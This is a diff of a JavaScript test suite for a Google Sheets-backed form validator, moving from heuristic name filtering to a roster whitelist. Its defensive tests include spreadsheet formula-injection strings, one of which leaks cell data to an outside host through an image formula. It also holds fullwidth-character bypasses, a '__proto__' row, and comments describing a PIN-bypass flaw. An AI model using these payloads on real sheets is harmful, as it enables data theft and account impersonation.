@@ -133,78 +133,50 @@ test('hasRecentNonce 必須掃描所有列，即使列順序反向', () => {
 });
 
 // --- validateSubmission：表單驗證與清理 ---
-test('validateSubmission 正常送出，回傳清理過的值', () => {
-  const r = lib.validateSubmission({ name: '  阿明  ', pin: '1234', bet: '85000', nonce: 'abc-123' });
+test('validateSubmission 正常送出，回傳清理過的值（canonical 名字）', () => {
+  const r = lib.validateSubmission({ name: '  Kevin  ', pin: '1234', bet: '85000', nonce: 'abc-123' });
   assert.strictEqual(r.ok, true);
-  assert.strictEqual(r.name, '阿明');
+  assert.strictEqual(r.name, 'Kevin');
   assert.strictEqual(r.pin, '1234');
   assert.strictEqual(r.bet, 85000);
   assert.strictEqual(typeof r.bet, 'number');
   assert.strictEqual(r.nonce, 'abc-123');
 });
 
-test('validateSubmission 拒絕以 = 開頭的名字（公式注入）', () => {
-  const r = lib.validateSubmission({ name: '=TEXTJOIN(",",1,players!C2:C30)', pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(r.ok, false);
-  assert.strictEqual(r.reason, 'bad_name');
-});
-
-test('validateSubmission 拒絕以 +、-、@ 開頭的名字', () => {
-  ['+1', '-1', '@1'].forEach((bad) => {
-    const r = lib.validateSubmission({ name: bad, pin: '1234', bet: 1, nonce: 'n1' });
-    assert.strictEqual(r.ok, false, bad + ' 應該被拒絕');
-    assert.strictEqual(r.reason, 'bad_name');
-  });
-});
-
-test('validateSubmission 名字長度上限 20，剛好 20 可過、21 被拒', () => {
-  const ok = lib.validateSubmission({ name: 'a'.repeat(20), pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(ok.ok, true);
-  const bad = lib.validateSubmission({ name: 'a'.repeat(21), pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(bad.ok, false);
-  assert.strictEqual(bad.reason, 'bad_name');
-});
-
-test('validateSubmission 拒絕含換行字元的名字', () => {
-  const r = lib.validateSubmission({ name: '阿明\n阿明', pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(r.ok, false);
-  assert.strictEqual(r.reason, 'bad_name');
-});
-
 test('validateSubmission 拒絕 3 位數與 5 位數的 PIN', () => {
-  const short = lib.validateSubmission({ name: '阿明', pin: '123', bet: 1, nonce: 'n1' });
+  const short = lib.validateSubmission({ name: 'Kevin', pin: '123', bet: 1, nonce: 'n1' });
   assert.strictEqual(short.ok, false);
   assert.strictEqual(short.reason, 'bad_pin');
-  const long = lib.validateSubmission({ name: '阿明', pin: '12345', bet: 1, nonce: 'n1' });
+  const long = lib.validateSubmission({ name: 'Kevin', pin: '12345', bet: 1, nonce: 'n1' });
   assert.strictEqual(long.ok, false);
   assert.strictEqual(long.reason, 'bad_pin');
 });
 
 test('validateSubmission 拒絕非數字 PIN', () => {
-  const r = lib.validateSubmission({ name: '阿明', pin: 'abcd', bet: 1, nonce: 'n1' });
+  const r = lib.validateSubmission({ name: 'Kevin', pin: 'abcd', bet: 1, nonce: 'n1' });
   assert.strictEqual(r.ok, false);
   assert.strictEqual(r.reason, 'bad_pin');
 });
 
 test('validateSubmission 拒絕 0、負數、NaN、Infinity 與 1e9 的 bet', () => {
   [0, -1, NaN, Infinity, 1e9].forEach((bet) => {
-    const r = lib.validateSubmission({ name: '阿明', pin: '1234', bet, nonce: 'n1' });
+    const r = lib.validateSubmission({ name: 'Kevin', pin: '1234', bet, nonce: 'n1' });
     assert.strictEqual(r.ok, false, 'bet=' + bet + ' 應該被拒絕');
     assert.strictEqual(r.reason, 'bad_bet');
   });
 });
 
 test('validateSubmission 拒絕含空白或引號的 nonce', () => {
-  const withSpace = lib.validateSubmission({ name: '阿明', pin: '1234', bet: 1, nonce: 'has space' });
+  const withSpace = lib.validateSubmission({ name: 'Kevin', pin: '1234', bet: 1, nonce: 'has space' });
   assert.strictEqual(withSpace.ok, false);
   assert.strictEqual(withSpace.reason, 'bad_nonce');
-  const withQuote = lib.validateSubmission({ name: '阿明', pin: '1234', bet: 1, nonce: 'has"quote' });
+  const withQuote = lib.validateSubmission({ name: 'Kevin', pin: '1234', bet: 1, nonce: 'has"quote' });
   assert.strictEqual(withQuote.ok, false);
   assert.strictEqual(withQuote.reason, 'bad_nonce');
 });
 
 test('validateSubmission 拒絕超過 64 字元的 nonce', () => {
-  const r = lib.validateSubmission({ name: '阿明', pin: '1234', bet: 1, nonce: 'n'.repeat(65) });
+  const r = lib.validateSubmission({ name: 'Kevin', pin: '1234', bet: 1, nonce: 'n'.repeat(65) });
   assert.strictEqual(r.ok, false);
   assert.strictEqual(r.reason, 'bad_nonce');
 });
@@ -217,14 +189,52 @@ test('validateSubmission 對 null body 回傳失敗而不拋例外', () => {
   });
 });
 
-// --- validateSubmission：驗證的是 name，但寫進 Sheet 的 player_id 來自
-// normalizeName(name) 的 NFKC 正規化結果。全形／相容變體字元經 NFKC 後
-// 會變成 ASCII 的 =、+、-、@，因此必須連 player_id 一起檢查，
-// 否則像「﹦players!c2」這種 name 本身通得過檢查，NFKC 之後卻變成公式注入。
-// 這批測試刻意呼叫 validateSubmission 本身（而非分別單測 normalizeName／
-// 舊版正規表達式），因為漏洞正好出在兩者之間的介面上。
-test('validateSubmission 擋下 NFKC 正規化後才會變成公式開頭的全形／相容變體字元', () => {
-  const attacks = ['＝1', '﹦players!c2', '＋1', '－1', '＠1', '﹦image("//a.tw/"&b2)'];
+// --- ROSTER／rosterIdOf：白名單取代原本一整組啟發式檢查 ---
+test('ROSTER 剛好 25 個名字，正規化後彼此不重複', () => {
+  assert.strictEqual(lib.ROSTER.length, 25);
+  const normalized = lib.ROSTER.map(lib.normalizeName);
+  assert.strictEqual(new Set(normalized).size, 25);
+});
+
+test('rosterIdOf 忽略大小寫與全形半形，一律解析回同一個 canonical 名字', () => {
+  ['kevin', 'KEVIN', 'Ｋｅｖｉｎ', '  Kevin  '].forEach((input) => {
+    assert.strictEqual(lib.rosterIdOf(input), 'Kevin', JSON.stringify(input) + ' 應該解析成 Kevin');
+  });
+});
+
+test('rosterIdOf 對不在名單上的輸入回傳 null', () => {
+  assert.strictEqual(lib.rosterIdOf('Mallory'), null);
+  assert.strictEqual(lib.rosterIdOf(''), null);
+  assert.strictEqual(lib.rosterIdOf(null), null);
+});
+
+test('validateSubmission 拒絕不在名單上的名字', () => {
+  const r = lib.validateSubmission({ name: 'Mallory', pin: '1234', bet: 1, nonce: 'n1' });
+  assert.strictEqual(r.ok, false);
+  assert.strictEqual(r.reason, 'bad_name');
+});
+
+test('validateSubmission 回傳的是 canonical 名字，不是呼叫端送來的大小寫版本', () => {
+  const r = lib.validateSubmission({ name: 'mark88', pin: '1234', bet: 1, nonce: 'n1' });
+  assert.strictEqual(r.ok, true);
+  assert.strictEqual(r.name, 'Mark88');
+  assert.strictEqual(r.playerId, lib.normalizeName('Mark88'));
+});
+
+test('ROSTER 裡每一個名字都能通過 validateSubmission，且 playerId 不是空的、不以公式字元開頭', () => {
+  lib.ROSTER.forEach((name) => {
+    const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
+    assert.strictEqual(r.ok, true, JSON.stringify(name) + ' 應該通過');
+    assert.ok(r.playerId.length > 0, JSON.stringify(name) + ' 的 playerId 不該是空的');
+    assert.ok(!/^[=+\-@']/.test(r.playerId), JSON.stringify(name) + ' 的 playerId 不該以公式字元開頭：' + r.playerId);
+  });
+});
+
+// 這些輸入曾經需要靠 breaksSheetRoundTrip／Number() 之類的啟發式一一擋下，
+// 白名單上路後它們全都不在 ROSTER 裡，單靠 membership 檢查就會被拒絕，
+// 不必再猜 Google Sheets 的 USER_ENTERED 剖析器認不認得這些格式。
+test('先前需要靠啟發式擋下的輸入，現在單靠不在名單上就被拒絕', () => {
+  const attacks = ['1,234', '$5', '50%', '(7)', 'jan 5', '12pm', '123', "'kevin", '＝1'];
   attacks.forEach((bad) => {
     const r = lib.validateSubmission({ name: bad, pin: '1234', bet: 1, nonce: 'n1' });
     assert.strictEqual(r.ok, false, JSON.stringify(bad) + ' 應該被拒絕');
@@ -232,87 +242,23 @@ test('validateSubmission 擋下 NFKC 正規化後才會變成公式開頭的全�
   });
 });
 
-test('validateSubmission 通過的 playerId 一律不以 =+-@ 開頭，也不含控制字元', () => {
-  const goodNames = ['阿明', '陳小明', '  kevin  ', 'Ｋｅｖｉｎ', 'KEVIN', '大雄', '王大同'];
-  goodNames.forEach((name) => {
-    const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
-    assert.strictEqual(r.ok, true, JSON.stringify(name) + ' 應該通過');
-    assert.ok(!/^[=+\-@]/.test(r.playerId), JSON.stringify(name) + ' 的 playerId 不該以公式字元開頭：' + r.playerId);
-    assert.ok(!/[\x00-\x1F\x7F]/.test(r.playerId), JSON.stringify(name) + ' 的 playerId 不該含控制字元');
-  });
-});
-
-test('validateSubmission 一般名字（例如「阿明」）的 playerId 等於 normalizeName(name)', () => {
-  const r = lib.validateSubmission({ name: '阿明', pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(r.ok, true);
-  assert.ok('playerId' in r);
-  assert.strictEqual(r.playerId, lib.normalizeName('阿明'));
-});
-
-test('validateSubmission 拒絕正規化後變成空字串的名字', () => {
-  // U+FEFF（BOM／零寬不斷行空白）NFKC 後被 trim 掉，name 本身非空、不含控制字元、
-  // 不以 =+-@ 開頭，會通過既有檢查，但 playerId 會是空字串。
-  const r = lib.validateSubmission({ name: '﻿', pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(r.ok, false);
-  assert.strictEqual(r.reason, 'bad_name');
-});
-
-test('validateSubmission 剛好 20 個中文字的名字要能通過（上限不能誤傷真玩家）', () => {
-  const name = '陳'.repeat(20);
-  const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(r.ok, true);
-  assert.strictEqual(r.playerId, lib.normalizeName(name));
-});
-
-test('validateSubmission 超過 20 字的注入字串仍回報 bad_name（確認調換順序沒弄壞長度檢查）', () => {
-  const tooLong = '﹦image("//a.tw/"&b22)'; // 21 字，開頭是相容變體全形等號，非 ASCII 開頭
-  assert.strictEqual(tooLong.length, 21);
-  const r = lib.validateSubmission({ name: tooLong, pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(r.ok, false);
-  assert.strictEqual(r.reason, 'bad_name');
-});
-
-// --- 認證繞過／冒名：playerId 必須能在 Sheet 儲存格原樣往返 ---
-// appendRow 是「使用者輸入」語意的寫入，getValues() 讀回的是型別轉換後的值。
-// 若 playerId 是數字看起來的字串、true/false、日期或前導單引號，
-// 寫進 players!A 後讀回來就不再 === 原本算出的 playerId，
-// authenticate_ 的比對永遠不成立 -> 落入「首次註冊」分支 -> 任何 PIN 都會被接受。
-// 這批測試對應報告裡驗證過「目前全部通過」的那張表，逐一改成應被拒絕。
-test('validateSubmission 拒絕會在 Sheet 儲存格變型別的 playerId（認證繞過表）', () => {
-  const cases = ['123', '１２３', '1e5', '0012', 'true', '1/2', "'kevin", '＇kevin'];
-  cases.forEach((name) => {
-    const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
-    assert.strictEqual(r.ok, false, JSON.stringify(name) + ' 應該被拒絕');
-    assert.strictEqual(r.reason, 'bad_name', JSON.stringify(name) + ' 應該回傳 bad_name');
-  });
-});
-
 test('validateSubmission 拒絕會在 Sheet 儲存格變型別的 nonce（破壞冪等）', () => {
-  const cases = ['-A2', '-1-1', '--x', '12345'];
+  const cases = ['-A2', '-1-1', '--x', '12345', '=1'];
   cases.forEach((nonce) => {
-    const r = lib.validateSubmission({ name: '阿明', pin: '1234', bet: 1, nonce });
+    const r = lib.validateSubmission({ name: 'Kevin', pin: '1234', bet: 1, nonce });
     assert.strictEqual(r.ok, false, JSON.stringify(nonce) + ' 應該被拒絕');
     assert.strictEqual(r.reason, 'bad_nonce', JSON.stringify(nonce) + ' 應該回傳 bad_nonce');
   });
 });
 
-test('validateSubmission 拒絕 NFKC 展開後超過 20 字的 playerId（U+2A76 -> "==="）', () => {
-  // 'a'（1字）+ 19 個 U+2A76，來源字串共 20 字，NFKC 後 playerId 長達 58 字。
-  // 註解曾宣稱 NFKC 只會讓字元變短或不變，這個字元證明是錯的。
-  const name = 'a' + '⩶'.repeat(19);
-  assert.strictEqual(name.length, 20);
-  const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
-  assert.strictEqual(r.ok, false);
-  assert.strictEqual(r.reason, 'bad_name');
-});
-
-test('validateSubmission 正常名字仍必須通過（不能誤傷真玩家）', () => {
-  const goodNames = ['阿明', '小美', 'Kevin', '大 雄', '007阿明', '陳'.repeat(20), 'Player1'];
-  goodNames.forEach((name) => {
-    const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
-    assert.strictEqual(r.ok, true, JSON.stringify(name) + ' 應該通過');
-    assert.ok('playerId' in r);
-  });
+// --- rosterFromRows 對任意 player_id 的防護，不依賴呼叫端保證 ---
+test('rosterFromRows 遇到 player_id 為 __proto__ 的列，仍正確算出 1 筆', () => {
+  const rows = [
+    row('2026-08-26T14:03:11+08:00', '__proto__', 'Kevin', 1, 16, 24, 78412, 85000, 8.40, 'n1'),
+  ];
+  const r = lib.rosterFromRows(rows);
+  assert.strictEqual(r.length, 1);
+  assert.strictEqual(r[0].name, 'Kevin');
 });
 
 // --- 讀取端防禦：getValues() 可能回傳數字或布林，不應該讓比對整組失效 ---
